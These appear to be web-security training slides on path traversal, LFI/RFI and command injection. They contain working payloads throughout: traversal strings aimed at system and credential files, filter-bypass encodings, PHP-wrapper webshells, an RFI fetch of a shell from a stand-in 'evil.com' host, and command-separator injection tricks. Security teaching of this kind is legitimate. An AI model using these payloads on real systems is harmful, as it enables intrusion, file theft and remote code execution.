## What is Directory/Path Traversal ?

•A path traversal attack (also known as directory traversal) aims
to access files and directories that are stored outside the web
root folder.

•By manipulating variables that reference files with “dot-dot-slash
(../)” sequences and its variations or by using absolute file
paths, it may be possible to access arbitrary files and directories
stored on file system including application source code or
configuration and critical system files

## How does it work ?

•file_read(“/htdocs/website/reports/” + user_input + “.pdf”)

```c
https://www.example.com/getfile?path=File2503sm
```


## Some common parameters or injection points
```c 
•file=
•location=
•lang=
• path=
• display=
•load=
•read=
•retrieve=

```

## Old school knowledge (1)

• Root folder
![](https://i.imgur.com/dL9jlpG.png)

•Directory separator symbols

![](https://i.imgur.com/CIwYSYV.png)

## Old school knowledge (2)
  • Move up the current directory

![](https://i.imgur.com/9Q5ajRy.png)

  • Terminate the current file name

![](https://i.imgur.com/F46WlQf.png)

## Detection

```code
•file=foo/file1.txt
• Try: file=foo/bar/../file1.txt
• Match => vulnerable
•Different => ???
```


## Basic directory/path traversal
 ```c 
 •../../../../../../../../../../../../../../etc/passwd
 •..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
 •If in write context, for Windows platforms
 • ../../../../../../../../../../../../writetest.txt
 • ../../../../../../../../../../../../windows/system32/config/sam
 • For Unix-based platforms
 • ../../../../../../../../../../../../tmp/writetest.txt
 • ../../../../../../../../../../../../tmp

If the second returns an error message but first does not, the application probably is vulnerable.
```

## Bypass waf/filter (1)

•URL encode
```c
  • . => %2e
  • / => %2f
  • \ => %5c
 ../ => %2e%2e%2f, %2e%2e/, ..%2f
 ..\ => %2e%2e%5c, %2e%2e\, ..%5c
 ```
•Double url encode
```c
  • ../ => %252e%252e%252f and so on
  • ..\ => %252e%252e%255c and so 
```

## Bypass waf/filter (2)

• 16-bit Unicode-Encoding
```c
  • . => %u002e
  • / => %u2215
  • \ => %u2216
```
•Overlong UTF-8 Unicode-Encoding
```c
  • . => %c0%2e, %e0%40%ae, %c0ae, …
  • / => %c0%af, %e0%80%af, %c0%2, ...
  • \ => %c0%5c, %c0%80%5c
```

## Bypass waf/filter (3)

• Bypass sanitize user input by removing traversal sequences and does not apply this filter recursively
```c
  • ....//
  • ....\/
  • ..../\
  • .....\\
```  
•Using %00, %0a to bypass file type checking, file type inserting
```c
  • ../../../../../../../../etc/passwd%00
  • ../../../../../../../../etc/passwd%0a.jpg
```
## Bypass waf/filter (4)

• Some applications check whether the user-supplied file name starts
with a particular subdirectory of the start directory, or even a specific
file name.
```c
  • wahh-app/images/../../../../../../../etc/passwd
```

## What is LFI/RFI ?

• Many scripting languages support the use of include files. This facility
enables developers to place reusable code components into separate
files and to include these within function-specific code files as and
when they are needed. The code within the included file is
interpreted just as if it had been inserted at the location of the
include directive.

## Old school knowledge (1)

•include

## Old school knowledge (2)

•require
![](https://i.imgur.com/rjqkiZw.png)

## Old school knowledge (3)
```c
• Some another functions:
• include_once()
• require_once()
```
## How does it work ? (1)

```c

$file = $_GET[‘page’];
include($file);

https://example.com/xxx/page=index.php
```

## How does it work ? (2)

```
• 
require("config/" . $_COOKIE['pref_file'] . ".inc.php");
die("This is a test");

```

##  Detection and Bypass waf/filter / Basic LFI (1)

• The methods are the same Directory/Path traversal

```c
• http://example.com/index.php?page=../../../etc/passwd
• Null byte
• http://example.com/index.php?page=../../../etc/passwd%00
• Double encoding
• http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
• Path truncation
• http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD
MORE]\.\. http://example.com/index.php?page=../../../../[…]../../../../../etc/passwd
• Filter bypass tricks
• http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../
%5C../%5C../%5C../etc/passwd
```
## Basic RFI (2)
```c 
• Requires allow_url_fopen=On and allow_url_include=On (in php.ini)
• http://example.com/index.php?page=http://evil.com/shell.txt
```

## Exploitation

```c
• LFI / RFI using wrappers
• LFI to RCE via /proc/self/environ
• LFI to RCE via upload
• LFI to RCE via controlled log file
• LFI to RCE via PHP sessions
• LFI to RCE via /proc
```

##  LFI / RFI using wrappers (1)

 ```c 
 • Wrapper php://filter (the part "php://filter" is case insensitive)
• http://example.com/index.php?page=php://filter/read=string.rot13/resource=inde
x.php
• http://example.com/index.php?page=php://filter/convert.base64-encode/resource
=index.php
• http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resourc
e=index.php
• Can be chained with a compression wrapper for large files.
• http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-enco
de/resource=/etc/passwd

```
##  LFI / RFI using wrappers (2)

```c 
•Wrapper zip://
• echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
• zip payload.zip payload.php;
• mv payload.zip shell.jpg;
• rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

``` 
## LFI / RFI using wrappers (3)

```c
•Wrapper data://
• http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRf
R0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

## LFI / RFI using wrappers (4)

```c
•Wrapper expect://
• http://example.com/index.php?page=expect://id
• http://example.com/index.php?page=expect://ls

```

## LFI / RFI using wrappers (5)

```
•Wrapper input://
• http://example.com/index.php?page=php://input
• POST DATA: <? system('id'); ?>
```

## LFI to RCE via /proc/self/environ

```
•GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## LFI to RCE via upload

```
•If you can upload a file, just inject the shell payload in it (e.g : <?php
system($_GET['c']); ?> ).
• http://example.com/index.php?page=path/to/uploaded/file.png
•In order to keep the file readable it is best to inject into the metadata
for the pictures/doc/pdf
```
## LFI to RCE via controlled log file

```c
• Read tutorials which are sent
```

## Command injection & What is Command Injection ? (1)

•According to the OWASP, “Command injection (a.k.a shell injection) is an attack in which the goal, is the execution of arbitrary commands on the host operating system through a vulnerable application”

• This attack is possible when an application passes unsafe user supplied data (i.e forms, cookies, HTTP headers etc) to a system shell.

• The attacker-supplied OS Commands are usually executed with the same
privileges of the vulnerable application.

• Command injection is not the same as a remote code execution
(RCE). The difference is that with an RCE, actual programming code is
executed, whereas with a command injection, it’s an (OS) command
being executed.

## What is Command Injection ? (2)

• Context has observed this type of attack in a large number of
applications:
• Applications that send an email to a user supplied address,
• Enterprise Server Monitoring applications that return system health
information,
• Applications that use 3rd party tools to generate on-the-fly reports based on
user supplied input.
• ...

##  What causes Command injection flaws ?

```
• echo exec(“/bin/ping –c 4”.$_GET[“addr”]);
•if(isset($_GET['dir'])) echo "Dir contents are:\n<br />".shell_exec("ls
{$_GET['dir']}");
• puts `ping -c 4 #{ARGV[0]}
```

## Some functions which support OS commands

```c
• eval()
• preg_replace() via “/e” modifier
• usort()
• assert()
• exec()
•shell_exec()
• Runtime.exec (Java)
•...
```
## Detection

• Many troubles must be resolved
• The syntax problem
• The problem of input-sanitizing mechanisms
• Platform-specific conditions
• The problem of the feedback channel

## The syntax problem (1)

• FULL_COMMAND (when command is directly injected into an expression)

• FULL_COMMAND+COMMAND_TERMINATOR (when the command is directly injected into the beginning of the expression and then it is appended with some arguments/other commands)

• COMMAND_SEPARATOR + FULL_COMMAND (when command is appended as an argument of a command hardcoded in the expression)

• COMMAND_SEPARATOR + FULL_COMMAND + COMMAND_SEPARATOR

(when the command is appended as an argument to a command
hardcoded in the expression AND appended with some arguments/other
commands)

## The syntax problem (2)

•All the above combinations need corresponding versions targeted at
quoted expression:
• Single quotes
• Double quotes

## The knowledge about shell (1)

• Command substitution: `[command]`
```
  • ping -c 4 8.8.8.8`sleep 5`  executed
  • ping -c 4 "8.8.8.8`sleep 5`”  executed
  • ping -c 4 $(echo 8.8.8.8`sleep 5`)  executed
  • ping -c 4 ‘8.8.8.8`sleep 5`’  not executed
  • ping -c 4 `echo 8.8.8.8`sleep 5``  not exec
``` 

## The knowledge about shell (2)

• Command substitution: $(sleep 5)
```
  • ping -c 4 8.8.8.8$(sleep 5)  executed
  • ping -c 4 "8.8.8.8$(sleep 5)”  executed
  • ping -c 4 $(echo 8.8.8.8$(sleep 5))  executed
  • ping -c 4 ‘8.8.8.8$(sleep 5)’  not executed
  • ping -c 4 `echo 8.8.8.8$(sleep 5)`  exec
```
## The knowledge about shell (3)

• Command separator: ;sleep 5
```
  • ping -c 4 8.8.8.8;sleep 5  executed
  • ping -c 4 "8.8.8.8;sleep 5”  not executed
  • ping -c 4 $(echo 8.8.8.8;sleep 5)  executed
  • ping -c 4 ‘8.8.8.8;sleep 5’  not executed
  • ping -c 4 `echo 8.8.8.8;sleep 5`  exec
```

## The knowledge about shell (5)

• command1 > command2

• command1 < command2

• command1 >> command2

 These operators are redirection operators. They are used to redirect input or output
  
• command1 | command2

A pipe can be used to chain up multiple command. The output of one command is redirected into the next

• command1 || command2

Double pipes perform an OR operation. The second command will only execute if the first command fails

• command1 & command2

An ampersand will run the first command and then run the second command once the first command has
completed successfully

• command1 && command2

 A double ampersand performs an AND operation. The second command will execute only if the first command

## The problem of input-sanitizing mechanisms (1)

•Argument separators trickery (no space)
  ```c 
  • On nix:
• %20 - space
• %09 - horizontal tab
• $IFS$9 - IFS terminated with 9th (empty) argument holder
• {OS_COMMAND,ARGUMENT} - the brace expression (works under bash, does not under
dash)
• On win:
• %20 - space
• %09 - horizontal tab
• %0b - vertical tab
• %25ProgramFiles:~10,1%25

  ```
## The problem of input-sanitizing mechanisms (2)
• Command separators trickery

```c 
• On nix:
• %0a (new line character)
• %0d (carriage return character)
• ;
• &
• |
• On window:
• %0a (new line character)
• &
• |
• %1a - a magical character working as a command separator in .bat files
```

## The problem of input-sanitizing mechanisms (3)

```c
• String separators
• %00 (nullbyte)
• %F0%9F%92%A9 (Unicode poo character, known to cause string termination
in db software like MySQL)
• %20# - space followed by the hash sign (nix)
• %20:: - space followed by the :: cmd.exe one-line comment sequence
```

## Unrestricted File Upload

What is Unrestricted file upload ?

• The consequences of unrestricted file upload can vary, including
complete system takeover, an overloaded file system or database,
forwarding attacks to back-end systems, client-side attacks, or simple
defacement.
